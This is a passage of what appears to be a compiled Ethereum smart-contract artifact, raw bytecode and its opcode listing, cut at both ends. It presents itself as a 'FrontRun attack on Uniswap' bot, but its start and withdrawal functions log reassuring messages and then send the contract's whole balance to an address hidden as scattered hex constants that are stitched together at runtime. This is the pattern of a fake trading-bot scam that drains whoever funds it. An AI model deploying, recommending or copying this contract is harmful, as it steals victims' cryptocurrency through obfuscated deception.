030000000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b6001811415610a69576060610a5a6040518060400160405280600481526020017f303030300000000000000000000000000000000000000000000000000000000081525084610a76565b90508095505050505050610a71565b819450505050505b919050565b60608083905060608390506060815183510167ffffffffffffffff81118015610a9e57600080fd5b506040519080825280601f01601f191660200182016040528015610ad15781602001600182028036833780820191505090505b5090506060819050600080600091505b8551821015610b4f57858281518110610af657fe5b602001015160f81c60f81b838280600101935081518110610b1357fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610ae1565b600091505b8451821015610bc257848281518110610b6957fe5b602001015160f81c60f81b838280600101935081518110610b8657fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610b54565b82965050505050505092915050565b6000620287ef905090565b60006208bc81905090565b60006204d003905090565b60008160ff16600011158015610c0c575060098260ff1611155b15610c4157817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610c96565b8160ff16600a11158015610c595750600f8260ff1611155b15610c9157600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610c96565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e672046726f6e7452756e2061747461636b206f6e20556e69737761702e20546869732063616e2074616b652061207768696c6520706c6561736520776169742e2e2ea2646970667358221220c5967cd6e269ed28bae2282a8ba18efad2d4ad27df048e6b552eb8191a513ab364736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xFFA CODESIZE SUB DUP1 PUSH3 0xFFA DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x29E JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x29B SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x297 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x27D JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0xD4C DUP1 PUSH3 0x2AE PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xDF JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x16F JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x179 JUMPI PUSH2 0x4A JUMP JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0x183 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xA4 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x89 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xD1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xF4 PUSH2 0x221 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x134 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x177 PUSH2 0x2BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x181 PUSH2 0x35A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x219 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x219 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x2B7 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x28C JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x2B7 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x29A JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x48 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xCCF PUSH1 0x48 SWAP2 CODECOPY PUSH1 0x60 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x312 PUSH2 0x3F5 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x357 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xC9C PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x3AD PUSH2 0x40C JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3F2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x5A0 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x5A0 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7F9 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFBB2 SWAP1 POP PUSH1 0x0 PUSH2 0x487 PUSH2 0xBD1 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x2E8D5 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xBDC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x3DD44 SWAP1 POP PUSH1 0x0 PUSH2 0x4AF PUSH2 0xBE7 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x1DDAE SWAP1 POP PUSH1 0x60 PUSH2 0x4CD DUP10 PUSH2 0x4C8 DUP11 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4EB PUSH2 0x4DD DUP10 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x4E6 DUP10 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x509 PUSH2 0x4FB DUP9 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x504 DUP9 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x527 PUSH2 0x519 DUP8 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x522 DUP8 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x547 PUSH2 0x538 DUP7 DUP7 PUSH2 0xA76 JUMP JUMPDEST PUSH2 0x542 DUP6 DUP6 PUSH2 0xA76 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x58A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7EC JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x5D2 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5F4 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x645 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x655 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6EF JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x693 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6A3 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6EE JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6E1 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6ED JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x72D JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x73D JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7D7 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x77B JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x78B JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7D6 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7C9 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7D5 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x5B6 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x46DDF SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x833 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x82B JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x811 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x84C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x87F JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8FE JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x89A JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x8A6 DUP4 PUSH2 0xBF2 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x8B7 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8F0 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x888 JUMP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 EQ ISZERO PUSH2 0x95E JUMPI PUSH1 0x60 PUSH2 0x94F PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x3 DUP2 EQ ISZERO PUSH2 0x9B7 JUMPI PUSH1 0x60 PUSH2 0x9A8 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x2 DUP2 EQ ISZERO PUSH2 0xA10 JUMPI PUSH1 0x60 PUSH2 0xA01 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x1 DUP2 EQ ISZERO PUSH2 0xA69 JUMPI PUSH1 0x60 PUSH2 0xA5A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0xA9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0xAD1 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xB4F JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xAF6 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xB13 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xAE1 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xBC2 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xB69 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xB86 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 